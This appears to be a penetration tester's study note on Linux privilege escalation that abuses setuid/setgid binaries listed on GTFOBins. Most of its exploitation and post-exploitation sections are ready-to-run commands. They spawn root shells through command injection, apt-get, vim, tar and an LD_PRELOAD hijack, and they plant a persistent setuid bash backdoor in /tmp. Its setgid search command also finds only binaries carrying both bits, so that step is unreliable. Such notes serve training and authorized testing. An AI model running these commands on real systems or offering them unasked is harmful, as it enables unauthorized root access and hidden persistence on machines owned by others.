### 1. Technique Name:

Special Permissions â€“ setuid/setgid Abuse & GTFOBins
### 2. Summary:

Linux special permissions include `setuid` and `setgid`, which allow files or binaries to execute with the privileges of the file owner or group. If a binary with elevated privileges (e.g., owned by `root`) is misconfigured or inherently dangerous (like those listed on [GTFOBins](https://gtfobins.github.io/)), it can be exploited to gain privilege escalation.
### 3. Conditions / Requirements:

- Binary has `setuid` (`s` in owner permissions) or `setgid` (`s` in group permissions)
- Executable is owned by `root` or a high-privilege user
- Binary allows unintended command execution, file editing, or shell escape
- (Optional) Binary is listed on GTFOBins with a known exploit method
### 4. Enumeration:
#### A. Find `setuid` binaries owned by root:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
#### B. Find `setgid` binaries owned by root:

```bash
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```
#### C. Check specific binary behavior:

```bash
strings /path/to/binary | less
ldd /path/to/binary
```
#### D. Cross-reference with GTFOBins:

- Visit: [https://gtfobins.github.io/](https://gtfobins.github.io/)    
- Look up binary (e.g., `less`, `vim`, `cp`, `find`, `tar`, etc.)
- Check for "SUID" or "SUDO" exploitation methods
### 5. Exploitation:
#### A. Direct command injection if supported:

```bash
./vulnerable_binary some_input; /bin/bash
```
#### B. Use GTFOBins-provided payloads:

```bash
# Example: `apt-get` with SUDO privileges
sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```
#### C. Hijack library or environment variable (if `setuid` binary is not stripping env):

```bash
LD_PRELOAD=/tmp/shell.so ./setuid_binary
```
#### D. Reverse engineer unknown binaries for insecure functions (e.g., `system()`, file write operations)
### 6. Post-Exploitation:

- Maintain access via cronjob or setuid shell

```bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

- Cleanup modified binaries or created shells
- Enumerate for additional privilege escalation paths
### 7. Example:
#### A. Discovered `setuid` binary:

```bash
-rwsr-xr-x 1 root root 16728 payroll
```
#### B. Check execution:

```bash
./payroll
```
#### C. If not exploitable directly, check for:

- External library loading (shared object hijacking)    
- Command injection in arguments
- File path manipulation (PATH hijacking)
#### D. GTFOBin Example (e.g., `vim`):

```bash
vim -c ':!sh'
```

Or for `tar`:

```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #SUID #GUID